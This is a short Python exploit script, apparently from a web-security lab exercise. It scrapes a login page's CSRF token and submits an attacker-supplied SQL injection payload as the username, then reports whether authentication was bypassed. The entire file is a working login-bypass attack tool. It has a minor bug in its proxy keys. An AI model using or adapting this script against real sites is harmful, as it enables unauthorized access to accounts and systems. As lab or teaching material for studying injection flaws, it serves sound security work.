#!/usr/bin/python3
import sys
import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 

proxy = {'http:': 'http://127.0.0.1', 'https:':'http://127.0.0.1'}
def csrf(s,url):
	r= s.get(url,verify=False,proxies=proxy)
	soup=BeautifulSoup(r.text,'html.parser')
	csrf=soup.find('input')['value']
	return csrf
	
def exploit(s,url,payload):
	token=csrf(s,url)
	
	data={'csrf':token , 'username':payload, 'password':'random'}
	r= s.post(url,data,verify=False,proxies=proxy)
	res = r.text
	#print(res)
	if 'Log out' in res:
		return True
	else:
		return False
	

if __name__=='__main__':
	try :
		url=sys.argv[1].strip()
		payload=sys.argv[2].strip()
	except IndexError:
		print("[-] usage: <url> <payload>")
		print("[-] Example www.example.com '1=1'" )
		sys.exit(1)
	s = requests.session()
	if exploit(s,url, payload):
		print("Authentication bypass")
	else:
		print("not possible")
